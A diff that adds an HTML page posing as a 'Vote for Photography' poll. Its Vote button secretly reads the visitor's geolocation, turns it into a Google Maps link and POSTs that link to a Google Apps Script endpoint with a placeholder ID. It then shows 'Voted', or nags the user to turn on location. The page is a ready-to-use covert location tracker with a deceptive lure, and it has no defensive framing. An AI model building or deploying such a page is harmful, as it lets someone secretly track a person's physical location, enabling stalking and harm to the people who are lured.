@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Vote for Photography</title>
+</head>
+<body>
+  <h2>Vote for Photography</h2>
+  <button onclick="sendLocation()">Vote</button>
+
+  <script>
+    function sendLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+
+          fetch("https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ link: mapsLink })
+          }).then(() => {
+            alert("Voted");
+          }).catch(err => {
+            alert("Turn on location");
+            console.error(err);
+          });
+        }, function(error) {
+          alert("Permission denied or location error.");
+        });
+      } else {
+        alert("Geolocation not supported in your browser.");
+      }
+    }
+  </script>
+</body>
+</html>
